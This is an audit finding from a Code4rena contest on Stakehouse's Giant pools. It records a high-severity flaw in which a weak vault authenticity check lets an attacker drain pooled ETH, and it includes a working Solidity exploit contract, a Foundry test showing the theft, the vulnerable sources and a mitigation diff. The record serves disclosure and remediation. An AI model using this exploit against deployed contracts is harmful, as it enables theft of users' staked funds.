{
  "Title": "[H-17] Giant pools can be drained due to weak vault authenticity check",
  "Content": "# Lines of code\n\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L50\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantMevAndFeesPool.sol#L44\n\n\n# Vulnerability details\n\n## Impact\nAn attacker can withdraw all ETH staked by users in a Giant pool. Both `GiantSavETHVaultPool` and `GiantMevAndFeesPool` are affected.\n## Proof of Concept\nThe `batchDepositETHForStaking` function in the Giant pools check whether a provided vault is authentic by validating its liquid staking manager contract and sends funds to the vault when the check passes ([GiantSavETHVaultPool.sol#L48-L58](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L48-L58)):\n```solidity\nSavETHVault savETHPool = SavETHVault(_savETHVaults[i]);\nrequire(\n    liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),\n    \"Invalid liquid staking manager\"\n);\n\n// Deposit ETH for staking of BLS key\nsavETHPool.batchDepositETHForStaking{ value: transactionAmount }(\n    _blsPublicKeys[i],\n    _stakeAmounts[i]\n);\n```\n\nAn attacker can pass an exploit contract as a vault. The exploit contract will implement `liquidStakingManager` that will return a valid staking manager contract address to trick a Giant pool into sending ETH to the exploit contract:\n```solidity\n// test/foundry/GiantPools.t.sol\ncontract GiantPoolExploit {\n    address immutable owner = msg.sender;\n    address validStakingManager;\n\n    constructor(address validStakingManager_) {\n        validStakingManager = validStakingManager_;\n    }\n\n    function liquidStakingManager() public view returns (address) {\n        return validStakingManager;\n    }\n\n    function batchDepositETHForStaking(bytes[] calldata /*_blsPublicKeyOfKnots*/, uint256[] calldata /*_amounts*/) external payable {\n        payable(owner).transfer(address(this).balance);\n    }\n}\n\nfunction testPoolDraining_AUDIT() public {\n    // Register BLS key\n    address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);\n    registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);\n\n    // Set up users and ETH\n    address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n\n    address attacker = address(0x1337);\n    vm.label(attacker, \"attacker\");\n    vm.deal(attacker, 1 ether);\n\n    // User deposits ETH into Giant savETH\n    vm.prank(savETHUser);\n    giantSavETHPool.depositETH{value: 24 ether}(24 ether);\n    assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);\n    assertEq(address(giantSavETHPool).balance, 24 ether);\n\n    // Attacker deploys an exploit.\n    vm.startPrank(attacker);\n    GiantPoolExploit exploit = new GiantPoolExploit(address(manager));\n    vm.stopPrank();\n\n    // Attacker calls `batchDepositETHForStaking` to deposit ETH to their exploit contract.\n    bytes[][] memory blsKeysForVaults = new bytes[][](1);\n    blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);\n\n    uint256[][] memory stakeAmountsForVaults = new uint256[][](1);\n    stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);\n\n    giantSavETHPool.batchDepositETHForStaking(\n        getAddressArrayFromValues(address(exploit)),\n        getUint256ArrayFromValues(24 ether),\n        blsKeysForVaults,\n        stakeAmountsForVaults\n    );\n\n    // Vault got nothing.\n    assertEq(address(manager.savETHVault()).balance, 0 ether);\n    // Attacker has stolen user's deposit.\n    assertEq(attacker.balance, 25 ether);\n}\n```\n## Tools Used\nManual review\n## Recommended Mitigation Steps\nConsider taking a list of `LiquidStakingManager` addresses instead of vault addresses:\n```diff\n--- a/contracts/liquid-staking/GiantSavETHVaultPool.sol\n+++ b/contracts/liquid-staking/GiantSavETHVaultPool.sol\n@@ -27,12 +28,12 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {\n     /// @param _blsPublicKeys For every savETH vault, the list of BLS keys of LSDN validators receiving funding\n     /// @param _stakeAmounts For every savETH vault, the amount of ETH each BLS key will receive in funding\n     function batchDepositETHForStaking(\n-        address[] calldata _savETHVaults,\n+        address[] calldata _liquidStakingManagers,\n         uint256[] calldata _ETHTransactionAmounts,\n         bytes[][] calldata _blsPublicKeys,\n         uint256[][] calldata _stakeAmounts\n     ) public {\n-        uint256 numOfSavETHVaults = _savETHVaults.length;\n+        uint256 numOfSavETHVaults = _liquidStakingManagers.length;\n         require(numOfSavETHVaults > 0, \"Empty arrays\");\n         require(numOfSavETHVaults == _ETHTransactionAmounts.length, \"Inconsistent array lengths\");\n         require(numOfSavETHVaults == _blsPublicKeys.length, \"Inconsistent array lengths\");\n@@ -40,16 +41,18 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {\n\n         // For every vault specified, supply ETH for at least 1 BLS public key of a LSDN validator\n         for (uint256 i; i < numOfSavETHVaults; ++i) {\n+            require(\n+                liquidStakingDerivativeFactory.isLiquidStakingManager(_liquidStakingManagers[i]),\n+                \"Invalid liquid staking manager\"\n+            );\n+\n             uint256 transactionAmount = _ETHTransactionAmounts[i];\n\n             // As ETH is being deployed to a savETH pool vault, it is no longer idle\n             idleETH -= transactionAmount;\n\n-            SavETHVault savETHPool = SavETHVault(_savETHVaults[i]);\n-            require(\n-                liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),\n-                \"Invalid liquid staking manager\"\n-            );\n+            LiquidStakingManager liquidStakingManager = LiquidStakingManager(payable(_liquidStakingManagers[i]));\n+            SavETHVault savETHPool = liquidStakingManager.savETHVault();\n\n             // Deposit ETH for staking of BLS key\n             savETHPool.batchDepositETHForStaking{ value: transactionAmount }(\n```",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-11-lsd-network-stakehouse-contest",
  "Code": [
    {
      "filename": "contracts/liquid-staking/GiantSavETHVaultPool.sol",
      "content": "pragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { SavETHVault } from \"./SavETHVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { GiantPoolBase } from \"./GiantPoolBase.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\n\n/// @notice A giant pool that can provide protected deposit liquidity to any liquid staking network\ncontract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {\n\n    /// @notice Emitted when giant LP is burnt to receive dETH\n    event LPBurnedForDETH(address indexed savETHVaultLPToken, address indexed sender, uint256 amount);\n\n    constructor(LSDNFactory _factory) {\n        lpTokenETH = new GiantLP(address(this), address(0), \"GiantETHLP\", \"gETH\");\n        liquidStakingDerivativeFactory = _factory;\n    }\n\n    /// @notice Given the liquidity of the giant pool, stake ETH to receive protected deposits from many liquid staking networks (LSDNs)\n    /// @dev Take ETH from the contract balance in order to send money to the individual vaults\n    /// @param _savETHVaults List of savETH vaults that belong to individual liquid staking derivative networks\n    /// @param _ETHTransactionAmounts ETH being attached to each savETH vault in the list\n    /// @param _blsPublicKeys For every savETH vault, the list of BLS keys of LSDN validators receiving funding\n    /// @param _stakeAmounts For every savETH vault, the amount of ETH each BLS key will receive in funding\n    function batchDepositETHForStaking(\n        address[] calldata _savETHVaults,\n        uint256[] calldata _ETHTransactionAmounts,\n        bytes[][] calldata _blsPublicKeys,\n        uint256[][] calldata _stakeAmounts\n    ) public {\n        uint256 numOfSavETHVaults = _savETHVaults.length;\n        require(numOfSavETHVaults > 0, \"Empty arrays\");\n        require(numOfSavETHVaults == _ETHTransactionAmounts.length, \"Inconsistent array lengths\");\n        require(numOfSavETHVaults == _blsPublicKeys.length, \"Inconsistent array lengths\");\n        require(numOfSavETHVaults == _stakeAmounts.length, \"Inconsistent array lengths\");\n\n        // For every vault specified, supply ETH for at least 1 BLS public key of a LSDN validator\n        for (uint256 i; i < numOfSavETHVaults; ++i) {\n            uint256 transactionAmount = _ETHTransactionAmounts[i];\n\n            // As ETH is being deployed to a savETH pool vault, it is no longer idle\n            idleETH -= transactionAmount;\n\n            SavETHVault savETHPool = SavETHVault(_savETHVaults[i]);\n            require(\n                liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),\n                \"Invalid liquid staking manager\"\n            );\n\n            // Deposit ETH for staking of BLS key\n            savETHPool.batchDepositETHForStaking{ value: transactionAmount }(\n                _blsPublicKeys[i],\n                _stakeAmounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults\n    /// @param _savETHVaults List of savETH vaults being interacted with\n    /// @param _lpTokens List of savETH vault LP being burnt from the giant pool in exchange for dETH\n    /// @param _amounts Amounts of giant LP the user owns which is burnt 1:1 with savETH vault LP and in turn that will give a share of dETH\n    function withdrawDETH(\n        address[] calldata _savETHVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _savETHVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n\n        // Firstly capture current dETH balance and see how much has been deposited after the loop\n        uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));\n        for (uint256 i; i < numOfVaults; ++i) {\n            SavETHVault vault = SavETHVault(_savETHVaults[i]);\n\n            // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user\n            for (uint256 j; j < _lpTokens[i].length; ++j) {\n                LPToken token = _lpTokens[i][j];\n                uint256 amount = _amounts[i][j];\n\n                // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP\n                _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);\n\n                require(vault.isDETHReadyForWithdrawal(address(token)), \"dETH is not ready for withdrawal\");\n\n                // Giant LP is burned 1:1 with LPs from sub-networks\n                require(lpTokenETH.balanceOf(msg.sender) >= amount, \"User does not own enough LP\");\n\n                // Burn giant LP from user before sending them dETH\n                lpTokenETH.burn(msg.sender, amount);\n\n                emit LPBurnedForDETH(address(token), msg.sender, amount);\n            }\n\n            // Ask\n            vault.burnLPTokens(_lpTokens[i], _amounts[i]);\n        }\n\n        // Calculate how much dETH has been received from burning\n        dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;\n\n        // Send giant LP holder dETH owed\n        getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);\n    }\n\n    /// @notice Any ETH supplied to a BLS key registered with a liquid staking network can be rotated to another key if it never gets staked\n    /// @param _savETHVaults List of savETH vaults this contract will contact\n    /// @param _oldLPTokens List of savETH vault LP tokens that the vault has\n    /// @param _oldLPTokens List of new savETH vault LP tokens that the vault wants to receive in exchange for moving ETH to a new KNOT\n    /// @param _amounts Amount of old being swapped for new per LP token\n    function batchRotateLPTokens(\n        address[] calldata _savETHVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _savETHVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < numOfRotations; ++i) {\n            SavETHVault(_savETHVaults[i]).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Any ETH that has not been utilized by a savETH vault can be brought back into the giant pool\n    /// @param _savETHVaults List of savETH vaults where ETH is staked\n    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a savETH vault\n    /// @param _amounts Amounts of LP within the giant pool being burnt\n    function bringUnusedETHBackIntoGiantPool(\n        address[] calldata _savETHVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _savETHVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            SavETHVault vault = SavETHVault(_savETHVaults[i]);\n            for (uint256 j; j < _lpTokens[i].length; ++j) {\n                require(\n                    vault.isDETHReadyForWithdrawal(address(_lpTokens[i][j])) == false,\n                    \"ETH is either staked or derivatives minted\"\n                );\n            }\n\n            vault.burnLPTokens(_lpTokens[i], _amounts[i]);\n        }\n    }\n}"
    },
    {
      "filename": "contracts/liquid-staking/GiantMevAndFeesPool.sol",
      "content": "pragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { StakingFundsVault } from \"./StakingFundsVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { GiantPoolBase } from \"./GiantPoolBase.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\n\n/// @notice A giant pool that can provide liquidity to any liquid staking network's staking funds vault\ncontract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, SyndicateRewardsProcessor {\n\n    constructor(LSDNFactory _factory) {\n        lpTokenETH = new GiantLP(address(this), address(this), \"GiantETHLP\", \"gMevETH\");\n        liquidStakingDerivativeFactory = _factory;\n    }\n\n    /// @notice Stake ETH against multiple BLS keys within multiple LSDNs and specify the amount of ETH being supplied for each key\n    /// @dev Uses contract balance for funding and get Staking Funds Vault LP in exchange for ETH\n    /// @param _stakingFundsVault List of mev and fees vaults being interacted with\n    /// @param _ETHTransactionAmounts ETH being attached to each savETH vault in the list\n    /// @param _blsPublicKeyOfKnots For every staking funds vault, the list of BLS keys of LSDN validators receiving funding\n    /// @param _amounts List of amounts of ETH being staked per BLS public key\n    function batchDepositETHForStaking(\n        address[] calldata _stakingFundsVault,\n        uint256[] calldata _ETHTransactionAmounts,\n        bytes[][] calldata _blsPublicKeyOfKnots,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVault.length;\n        require(numOfVaults > 0, \"Zero vaults\");\n        require(numOfVaults == _blsPublicKeyOfKnots.length, \"Inconsistent lengths\");\n        require(numOfVaults == _amounts.length, \"Inconsistent lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            // As ETH is being deployed to a staking funds vault, it is no longer idle\n            idleETH -= _ETHTransactionAmounts[i];\n\n            StakingFundsVault sfv = StakingFundsVault(payable(_stakingFundsVault[i]));\n            require(\n                liquidStakingDerivativeFactory.isLiquidStakingManager(address(sfv.liquidStakingNetworkManager())),\n                \"Invalid liquid staking manager\"\n            );\n\n            sfv.batchDepositETHForStaking{ value: _ETHTransactionAmounts[i] }(\n                _blsPublicKeyOfKnots[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow a giant LP to claim a % of the revenue received by the MEV and Fees Pool\n    function claimRewards(\n        address _recipient,\n        address[] calldata _stakingFundsVaults,\n        bytes[][] calldata _blsPublicKeysForKnots\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty array\");\n        require(numOfVaults == _blsPublicKeysForKnots.length, \"Inconsistent array lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).claimRewards(\n                address(this),\n                _blsPublicKeysForKnots[i]\n            );\n        }\n\n        updateAccumulatedETHPerLP();\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            _recipient\n        );\n    }\n\n    /// @notice Preview total ETH accumulated by an address\n    function previewAccumulatedETH(\n        address _user,\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens\n    ) external view returns (uint256) {\n        require(_stakingFundsVaults.length == _lpTokens.length, \"Inconsistent array lengths\");\n\n        uint256 accumulated;\n        for (uint256 i; i < _stakingFundsVaults.length; ++i) {\n            accumulated = StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(\n                address(this),\n                _lpTokens[i]\n            );\n        }\n\n        return _previewAccumulatedETH(_user, address(lpTokenETH), lpTokenETH.balanceOf(_user), lpTokenETH.totalSupply(), accumulated);\n    }\n\n    /// @notice Any ETH supplied to a BLS key registered with a liquid staking network can be rotated to another key if it never gets staked\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _oldLPTokens List of savETH vault LP tokens that the vault has\n    /// @param _oldLPTokens List of new savETH vault LP tokens that the vault wants to receive in exchange for moving ETH to a new KNOT\n    /// @param _amounts Amount of old being swapped for new per LP token\n    function batchRotateLPTokens(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _stakingFundsVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < numOfRotations; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Any ETH that has not been utilized by a Staking Funds vault can be brought back into the giant pool\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a staking funds vault\n    /// @param _amounts Amounts of LP within the giant pool being burnt\n    function bringUnusedETHBackIntoGiantPool(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).burnLPTokensForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Distribute any new ETH received to LP holders\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(lpTokenETH.totalSupply());\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function beforeTokenTransfer(address _from, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        updateAccumulatedETHPerLP();\n\n        // Make sure that `_from` gets total accrued before transfer as post transferred anything owed will be wiped\n        if (_from != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                _from,\n                address(lpTokenETH),\n                lpTokenETH.balanceOf(_from),\n                _from\n            );\n        }\n\n        // Make sure that `_to` gets total accrued before transfer as post transferred anything owed will be wiped\n        _distributeETHRewardsToUserForToken(\n            _to,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(_to),\n            _to\n        );\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function afterTokenTransfer(address, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        _setClaimedToMax(_to);\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate excluding idle ETH from LP depositors\n    function totalRewardsReceived() public view override returns (uint256) {\n        return address(this).balance + totalClaimed - idleETH;\n    }\n\n    /// @dev On withdrawing LP in exchange for burning giant LP, claim rewards\n    function _onWithdraw(LPToken[] calldata _lpTokens) internal override {\n        // Use the transfer hook of LPToken to trigger the claiming accrued ETH\n        for (uint256 i; i < _lpTokens.length; ++i) {\n            _lpTokens[i].transfer(address(this), _lpTokens[i].balanceOf(address(this)));\n        }\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            msg.sender\n        );\n    }\n\n    /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued\n    function _onDepositETH() internal override {\n        _setClaimedToMax(msg.sender);\n    }\n\n    /// @dev Internal re-usable method for setting claimed to max for msg.sender\n    function _setClaimedToMax(address _user) internal {\n        // New ETH stakers are not entitled to ETH earned by\n        claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;\n    }\n}"
    }
  ]
}